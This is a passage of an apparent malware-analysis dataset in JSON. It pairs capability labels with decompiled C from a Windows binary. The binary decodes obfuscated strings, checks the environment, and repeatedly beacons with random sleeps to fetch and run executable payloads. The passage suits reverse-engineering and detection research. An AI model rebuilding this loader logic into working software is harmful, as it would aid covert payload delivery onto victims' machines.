pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                if (var_8h != 0) {\n                    (*pcVar2)(var_8h);\n                }\n                goto code_r0x0040221b;\n            }\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar4);\n            pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_8h != 0) {\n                (*pcVar2)(var_8h);\n            }\n        }\n        if (var_34h != 0) {\n            if (var_30h == 0) {\ncode_r0x004020a2:\n                iVar7 = var_34h;\n                iVar4 = fcn.00404523();\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar4 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar7);\n                    goto code_r0x0040221b;\n                }\n                pProxyInfo = 0x702d391c;\n                psz2 = 0x39046319;\n                var_8h = 0x6357702a;\n                var_4h._0_2_ = 0x3974;\n                var_1ch = 0x70593974;\n                var_18h._0_2_ = 0x636d;\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                var_14h = 0;\n                var_28h = &pProxyInfo - iVar7;\n                pszSrch = iVar7;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                    if (iVar4 != 0x2339d5) {\n                        *(var_14h + iVar7) = *(&var_1ch + var_14h % var_40h) ^ (var_14h + iVar7)[var_28h];\n                    }\n                    var_14h = var_14h + 1;\n                } while (var_14h < 0xe);\n                pProxyInfo = 0x6416535e;\n                psz2 = 0x53465825;\n                var_8h = 0x58516411;\n                var_1ch = 0x64625336;\n                var_18h._0_2_ = 0x5851;\n                uVar8 = (*pcVar2)(8, 0x19);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                iVar4 = 0;\n                var_28h = &pProxyInfo - iVar7;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n                    iVar3 = pszSrch;\n                    if (iVar5 != 0xfc9cb3) {\n                        *(iVar4 + iVar7) = *(&var_1ch + iVar4 % var_40h) ^ (iVar4 + iVar7)[&pProxyInfo - iVar7];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0xc);\n                iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, pszSrch);\n                pszSrch = iVar4 == lpcwszUrl;\n                var_14h = 0;\n                lpcwszUrl = fcn.00404563(&var_14h);\n                uVar8 = 1;\n                while (pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap,  lpcwszUrl != 0) {\n                    iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar7);\n                    if ((pszSrch == (iVar4 == lpcwszUrl)) && (iVar4 = fcn.00404523(),  iVar4 != 0)) {\n                        (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar4 + 2);\n                        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*pcVar2)(uVar6);\n                        goto code_r0x0040221b;\n                    }\n                    lpcwszUrl = fcn.00404563(&var_14h);\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar2)(0, iVar3);\n                (*pcVar1)(uVar8);\n            }\n            else {\n                do {\n                    iVar7 = fcn.00404563(&var_14h);\n                    if (iVar7 == 0) goto code_r0x004020a2;\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar7);\n                } while (iVar7 == 0);\n            }\n        }\n    }\n    uVar8 = 0;\ncode_r0x0040221b:\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_38h != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar2)(var_34h);\n    }\n    if (var_30h != 0) {\n        (*pcVar2)(var_30h);\n    }\n    return uVar8;\n}\n",
        "token_count": 2258
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint uVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    uint var_288h;\n    int32_t hHeap;\n    int32_t var_84h;\n    uchar *pszFirst;\n    uchar *var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint32_t var_57h;\n    uint var_53h;\n    uint var_4dh;\n    uint var_49h;\n    uchar var_45h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar uStack48;\n    uchar var_2bh;\n    int32_t lpLibFileName;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar8 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    hHeap = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar8)(uVar3 | 2);\n    var_1ch = 0x15770f00;\n    var_18h = 0x1c756002;\n    var_14h = 0x473f223d;\n    var_8h = 0x59324753;\n    var_4h._0_1_ = 0x4e;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_7ch = 0x5;\n    iVar12 = 0;\n    lpLibFileName = iVar5;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar6 != 0x849621) {\n            *(iVar12 + iVar5) = *(&var_8h + iVar12 % var_7ch) ^ (iVar12 + iVar5)[&var_1ch - iVar5];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0xc);\n    var_20h = 0x342e3a76;\n    var_1ch = 0xf315b07;\n    var_18h = 0x1500830;\n    var_14h = 0x5214182c;\n    var_10h._0_2_ = 0x1423;\n    var_10h._2_1_ = 0x59;\n    var_8h = 0x59435535;\n    var_4h._0_1_ = 0x66;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar12 = 0;\n    pszFirst = iVar5;\n    var_ch = &var_20h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        iVar2 = lpLibFileName;\n        iVar6 = pszFirst;\n        if (iVar7 != 0x985da1) {\n            *(iVar12 + iVar5) = *(&var_8h + iVar12 % var_7ch) ^ (iVar12 + iVar5)[&var_20h - iVar5];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x13);\n    puVar13 = &var_288h;\n    for (iVar5 = 0x200; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar2, iVar6);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    var_8h = (*pcVar8)(uVar4, &hHeap);\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n    pszFirst = puVar10;\n    iVar5 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(uVar4, 0x4114d8);\n    if (iVar5 == 0) goto code_r0x0040265f;\n    uVar9 = 0x4df;\n    do {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(uVar9);\ncode_r0x0040265f:\n        puVar11 = puVar10;\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar11 = 0;\n            puVar11 = puVar11 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, puVar10, 0x104);\n        _var_45h = _var_45h & 0xff | 0x9365e00;\n        stack0xffffffbb = 0x56312a56;\n        stack0xffffffbf = 0x26560236;\n        stack0xffffffc3 = 0x54365031;\n        stack0xffffffc7 = 0x4b312656;\n        var_34h._3_1_ = 0x36;\n        var_30h._0_1_ = 0x1f;\n        var_30h._1_1_ = 0x56;\n        var_30h._2_1_ = 0x43;\n        var_30h._3_1_ = 0x31;\n        var_14h = 0x567a3633;\n        var_10h._0_2_ = 0x3143;\n        *0x41dacc = puVar10;\n        uVar9 = (*pcVar8)(8, 0x31);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n        var_ch = 0x6;\n        iVar12 = 0;\n        var_84h = iVar5;\n        lpLibFileName = &var_44h - iVar5;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n            puVar11 = pszFirst;\n            if (iVar6 != 0x39414) {\n                *(iVar12 + iVar5) = *(&var_14h + iVar12 % var_ch) ^ (iVar12 + iVar5)[&var_44h - iVar5];\n            }\n            iVar12 = iVar12 + 1;\n        } while (iVar12 < 0x18);\n        iVar5 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar5);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar5 == 0) {\n            puVar10 = fcn.0040169d(puVar11);\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            fcn.00403b64(uVar4);\n        }\n        else {\n            if (1 < hHeap) {\n                *0x41dacc = *(var_8h + 4);\n            }\n            *0x41dad8 = fcn.0040236f();\n            fcn.0040bf33();\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            puVar10 = fcn.00404b5d();\n            (*_sym.imp.KERNEL32.dll_GetVersion)();\n            if (puVar10 == 0x1) {\n                fcn.00404c80();\n                uVar9 = (*pcVar8)(0, puVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n            }\n            else {\n                var_78h = 0x76184c74;\n                var_74h = 0x4c016531;\n                var_70h = 0x6520761d;\n                var_6ch._0_1_ = 5;\n                stack0xffffff91 = 0x4476184c;\n                var_67h = 0x144c0d65;\n                var_63h = 0x32650876;\n                var_5fh = 0xe762b4c;\n                var_5bh = 0x364c2265;\n                var_57h = 0x25650776;\n                var_53h._0_1_ = 0x4c;\n                stack0xffffffab = 0x3f652876;\n                var_4dh = 0x4762d4c;\n                var_49h = 0x374c2365;\n                _var_45h = 0x25650476;\n                stack0xffffffbb = 0x2476794c;\n                stack0xffffffbf = 0x294c2965;\n                stack0xffffffc3 = 0x3e650d76;\n                stack0xffffffc7 = 0x4762b4c;\n                var_34h._3_1_ = 0x65;\n                var_30h._0_1_ = 0x23;\n                var_30h._1_1_ = 0x4c;\n                var_30h._3_1_ = 0x76;\n                uStack48 = 0x61;\n                var_2bh = 0x65;\n                var_14h = 0x76594c51;\n                var_10h._0_2_ = 0x6561;\n                var_53h._1_1_ = var_6ch;\n                var_30h._2_1_ = var_6ch;\n                uVar9 = (*pcVar8)(8, 0x9d);\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n                iVar12 = 0;\n                var_84h = iVar5;\n                var_8h = &var_78h - iVar5;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                    if (iVar6 != 0x652fa4) {\n                        *(iVar12 + iVar5) = *(&var_14h + iVar12 % var_ch) ^ (iVar12 + iVar5)[&var_78h - iVar5];\n                    }\n                    iVar12 = iVar12 + 1;\n                } while (iVar12 < 0x4e);\n                var_57h = var_57h & 0xffffff | 0x5d000000;\n                var_53h._0_1_ = 0x4a;\n                var_53h._1_1_ = 0x25;\n                stack0xffffffab = 0x39783a4d;\n                var_4dh = 0x1d433976;\n                var_49h = 0x114d1b4a;\n                _var_45h = 0x22762578;\n                stack0xffffffbb = 0x534a0c43;\n                stack0xffffffbf = 0x1e781f4d;\n                stack0xffffffc3 = 0xb432c76;\n                stack0xffffffc7 = 0x304d1d4a;\n                var_34h._3_1_ = 0x78;\n                var_30h._0_1_ = 0x16;\n                var_30h._1_1_ = 0x76;\n                var_30h._2_1_ = 0x4d;\n                var_30h._3_1_ = 0x43;\n                lpLibFileName = 0x4d764a78;\n                var_24h._0_1_ = 0x43;\n                uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n                puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n                iVar12 = 0;\n                iVar5 = &var_57h + (3 - puVar10);\n                var_8h = iVar5;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                    if (iVar6 != 0xdb1443) {\n                        puVar10[iVar12] = *(&lpLibFileName + iVar12 % var_7ch) ^ (puVar10 + iVar12)[iVar5];\n                    }\n                    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    iVar12 = iVar12 + 1;\n                } while (iVar12 < 0x28);\n                uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n                puVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n                var_ch = puVar11;\n                uVar9 = (*pcVar8)(8, 0x208);\n                var_7ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n                for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar11 = 0;\n                    puVar11 = puVar11 + 1;\n                }\n                puVar11 = var_7ch;\n                for (iVar5 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar5 != 0;\n                    iVar5 = iVar5 + -1) {\n                    *puVar11 = 0;\n                    puVar11 = puVar11 + 1;\n                }\n                (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_84h, var_ch, 0x104);\n                (*pcVar1)(puVar10, var_7ch, 0x104);\n                iVar5 = fcn.0040ee89();\n                if (iVar5 != 0) {\ncode_r0x004029a3:\n                    fcn.00402277();\n                    uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040f79b, 0, 0, 0);\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n                    uVar4 = (*pcVar8)(0, var_ch);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    uVar4 = (*pcVar8)(0, var_7ch);\n                    (*pcVar1)(uVar4);\n                    do {\n                        (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n                    } while( true );\n                }\n                iVar5 = fcn.00409590();\n                if (iVar5 == 0) {\n                    iVar5 = fcn.0040973c();\n                    if (iVar5 == 0) goto code_r0x004029a3;\n                }\n                fcn.0040ad3b();\n            }\n        }\n        uVar9 = 0;\n    } while( true );\n}\n",
        "token_count": 3582
    },
    "0040307c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040307c(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *piVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    int32_t *piVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.0040c15c;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    piVar2 = in_EDX;\n    if (((arg_8h & 0x10) == 0) && ((*0x41dadc & 1) != 0)) {\n        var_20h = 0x413000;\n        piVar2 = in_EDX + 2;\n    }\n    iVar3 = *piVar2;\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar5 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.00401b9b(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.004018f7(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.00401d7a(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar5 + var_8h;\n            puVar4 = *in_EDX;\n            puVar6 = uVar5 + 0xc50 + var_8h;\n            for (iVar3 = in_EDX[4]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar6 = in_EDX[4] + var_8h + 0xc50 + uVar5;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar2 = in_EDX;\n            piVar7 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = *piVar2;\n                piVar2 = piVar2 + 1;\n                piVar7 = piVar7 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar5;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = in_EDX[4] + 0xc50 + uVar5 + var_4h;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41dadc & 1) != 0)) {\n                iVar3 = fcn.00402d3d();\n            }\n            else {\n                iVar3 = fcn.004029e5();\n            }\n            if (iVar3 == 0) {\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.00403244(in_ECX, var_4h + uVar5 + 0x40, var_4h + uVar5, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            fcn.00401a5e();\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1170
    },
    "004040d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004040d1(void)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint lpWSAData;\n    uint ARG_0;\n    uint var_74h;\n    int32_t var_70h;\n    uint32_t var_6ch;\n    int32_t var_68h;\n    int32_t *var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_3bh;\n    uchar var_37h;\n    uint var_36h;\n    uint var_32h;\n    uint var_2eh;\n    uint32_t var_28h;\n    char *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    char *var_10h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_74h = *0x41da90;\n    var_6ch = *0x41dd6c;\n    var_60h = 0x2d20162e;\n    var_5ch = 0x2b13295c;\n    var_58h = 0x18245320;\n    var_54h = 0x3f56272e;\n    var_18h = 5;\n    var_50h._0_1_ = 5;\n    stack0xffffffad = 0x3a4d3a31;\n    var_4bh = 0x40313402;\n    var_47h = 0x166e5a35;\n    var_43h = 0x77477d08;\n    var_3fh = 0x4c780f7c;\n    var_3bh._0_2_ = 0x797a;\n    var_3bh._2_1_ = 0x39;\n    var_8h = 0x4943744f;\n    var_4h._0_1_ = 0x39;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    var_14h = &var_60h - pcVar5;\n    var_10h = pcVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar6 != 0x280136) {\n            pcVar5[iVar9] = *(&var_8h + iVar9 % var_18h) ^ (pcVar5 + iVar9)[var_14h];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x28);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    var_70h = 6;\n    var_18h = 0;\n    var_ch = str.AJDJV__;\n    do {\n        var_8h = 0;\n        var_14h = 0;\n        iVar9 = 0;\n        var_68h = 1;\n        do {\n            if (var_ch[var_18h] != '\\0') {\n                cVar3 = *pcVar5;\n                pcVar8 = pcVar5;\n                while (cVar3 != var_ch[var_18h]) {\n                    if (cVar3 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x004041f3;\n                    }\n                    pcVar8 = pcVar8 + 1;\n                    cVar3 = *pcVar8;\n                }\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x20);\n        bVar1 = true;\ncode_r0x004041f3:\n        if (((*var_ch != '\\0') && (var_ch[0x1f] == '\\0')) && (bVar1)) {\n            var_3bh._3_1_ = 0x4d;\n            var_36h = 0x40013d40;\n            puVar10 = &ARG_0;\n            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_32h = 0x6c44070b;\n            puVar10 = &var_28h;\n            for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_37h = 6;\n            var_2eh._0_2_ = 0x165c;\n            var_2eh._3_1_ = 0x74;\n            var_20h = 0x58307462;\n            var_1ch._0_2_ = 0x3373;\n            var_2eh._2_1_ = var_37h;\n            uVar4 = (*pcVar2)(8, 0xf);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            var_68h = &var_3bh + (3 - iVar9);\n            do {\n                iVar7 = (*_sym.imp.USER32.dll_GetFocus)();\n                if (iVar7 != 0xff465d) {\n                    *(iVar6 + iVar9) = *(&var_20h + iVar6 % var_70h) ^ (iVar6 + iVar9)[var_68h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar9, var_74h);\n            iVar6 = fcn.0040bad5(0, &ARG_0, &var_14h, &var_8h);\n            if (iVar6 == 0) {\n                if (var_14h == 0) {\n                    fcn.0040cd6f();\n                    uVar4 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                if (var_28h < var_14h) {\n                    fcn.0040cd6f();\n                    var_6ch = var_6ch * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_6ch % 600000 + 60000);\n                }\n                else if (((4 < var_14h) && (var_14h == var_28h)) &&\n                        ((var_24h != NULL && ((*var_24h == 'M' && (var_24h[1] == 'Z')))))) {\n                    fcn.0040cbae();\n                    fcn.0040cd6f();\n                    uVar4 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n            }\n            uVar4 = (*pcVar2)(0, iVar9);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            pcVar5 = var_10h;\n        }\n        var_ch = var_ch + 0x20;\n        var_18h = var_18h + 1;\n    } while (var_ch < 0x41da40);\n    iVar9 = *var_64h;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return iVar9 != 0;\n}\n",
        "token_count": 1888
    },
    "004043f1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404467)\n// WARNING: Removing unreachable block (ram,0x00404477)\n// WARNING: Removing unreachable block (ram,0x00404484)\n// WARNING: Removing unreachable block (ram,0x0040448f)\n// WARNING: Removing unreachable block (ram,0x0040449e)\n// WARNING: Removing unreachable block (ram,0x004044a8)\n// WARNING: Removing unreachable block (ram,0x004044aa)\n// WARNING: Removing unreachable block (ram,0x004044b0)\n// WARNING: Removing unreachable block (ram,0x004044c6)\n\nuint __cdecl fcn.004043f1(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar3 = *0x41dd6c;\n    puVar4 = 0x41dac4;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.00403ff2();\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    (*_sym.imp.KERNEL32.dll_Sleep)(600000);\n    while (*0x41dd68 == 0) {\n        if (*0x41da90 == 0) {\n            iVar2 = 0x32;\n        }\n        else {\n            iVar2 = fcn.004040d1();\n            if (iVar2 != 0) {\n                fcn.0040cd6f();\n            }\n            uVar3 = uVar3 * 0x19660d + 0x3c6ef35f;\n            iVar2 = uVar3 % 600000 + 60000;\n        }\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 435
    },
    "0040480b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040480b(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    uVar6 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x0040484d;\n                pcVar3 = param_1 + pcVar2;\n            } while (*pcVar3 != '\\\\');\n            if (pcVar3 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar3 + 1));\n                param_1 = pcVar3 + 1;\n            }\n        }\ncode_r0x0040484d:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar3 = pcVar2;\n            pcVar5 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar5 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar3 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar3 = pcVar3 + 1;\n            }\n            pcVar2[pcVar5] = '\\0';\n            cVar4 = *pcVar2;\n            pcVar3 = pcVar2;\n            while (cVar4 != '\\0') {\n                cVar4 = *pcVar3;\n                if (cVar4 + 0x9fU < 0x1a) {\n                    cVar4 = cVar4 + -0x20;\n                }\n                *pcVar3 = cVar4;\n                pcVar3 = pcVar3 + 1;\n         